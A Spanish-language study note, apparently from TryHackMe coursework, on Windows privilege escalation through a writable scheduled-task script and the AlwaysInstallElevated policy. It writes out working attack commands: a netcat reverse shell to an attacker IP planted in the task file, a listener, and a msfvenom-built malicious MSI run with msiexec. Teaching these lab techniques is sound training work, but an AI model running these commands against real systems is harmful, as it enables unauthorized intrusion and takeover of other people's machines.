---
layout: apunte
title: "3. Other Quick Wins"
---

La escalada de privilegios no siempre es un reto. A veces las malas configuraciones pueden permitirte obtener privilegios elevados. Los siguientes escenarios pertenecen más a los CTF que a los escenarios de la vida real. Sin embargo, si los métodos anteriores fallan, no pierdes nada probando estos.

--------------------------------------
<h2>Scheduled Tasks</h2>
Mirando en las tareas programadas del sistema objetivo, puedes ver alguna tarea programada que haya perdido su binario o esté usando un binario que puedas modificar.

Las tareas programadas pueden ser listadas desde la linea de comandos usando el comando `schtasks` sin opciones. Para recuperar información detallada sobre cualquier servicio, puedes usar un comando como el siguiente:

```cmd
C:\> schtasks /query /tn vulntask /fo list /v
Folder: \
HostName:                             THM-PC1
TaskName:                             \vulntask
Task To Run:                          C:\tasks\schtask.bat
Run As User:                          taskusr1
```

Recibirás mucha información, pero lo que nos interesa a nosotros es el parámetro "Task to run", que indica lo que se ejecuta por la tarea programada y el parámetro "Run As User" que muestra qué usuario ejecutará la tarea.

Si nuestro usuario actual puede modificar o sobrescribir el ejecutable listado en "Task to Run", podemos controlar lo que se ejecuta, resultando en una escalada de privilegios. Para comprobar los permisos del archivo ejecutable podemos usar `icacls`:

```cmd
C:\> icacls c:\tasks\schtask.bat
c:\tasks\schtask.bat NT AUTHORITY\SYSTEM:(I)(F)
                    BUILTIN\Administrators:(I)(F)
                    BUILTIN\Users:(I)(F)
```

Como podemos ver en el resultado, el grupo **BUILTIN\Users** tiene acceso completo (**F**) sobre el binario. Esto significa que podemos modificar el archivo `.bar` e insertar cualquier payload que queramos. Cambiemos el binario a:

```powershell
cmd /c "echo C:\tools\nc64.exe -e powershell.exe 192.168.128.94 4444 > C:\tasks\schtask.bat"
```

Luego comenzamos un listener en nuestra máquina:

`nc -lvp 4444`

La próxima vez que se ejecute la tarea programada, recibiremos una reverse shell con los privilegios del usuario `taskusr1`.

Si puedes ejecutar la tarea para no tener que esperar, hazlo con: `schtasks /run /tn vulntask`.

-----------------------------------
<h2>AlwaysInstallElevated</h2>
Los archivos Windows Installer, también conocidos como archivos `.msi`, se usan para instalar aplicaciones en el sistema. Suelen correr con los privilegios del usuario que los ejecuta. Sin embargo pueden ser configurados para correr con privilegios superiores (incluso desde una cuenta sin privilegios). Esto nos permitiría generar archivos MSI maliciosos que corrieran con permisos de administrador.

Este método requiere que haya dos valores registry configurados. Puedes encontrar estos desde la linea de comandos usando los comandos de abajo:

```cmd
C:\> reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
C:\> reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
```

Si **AMBOS** están configurados, puedes generar un archivo MSI malicioso con msfvenom así:

`msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKING_MACHINE_IP LPORT=LOCAL_PORT -f msi -o malicious.msi`

Como es una reverse shell debes ejecutar el handler de Metasploit correctamente configurado. Una vez configurado puedes ejecutar el archivo MSI de la siguiente forma y recibirás la shell.

```cmd
C:\> msiexec /quiet /qn /i C:\Windows\Temp\malicious.msi
```
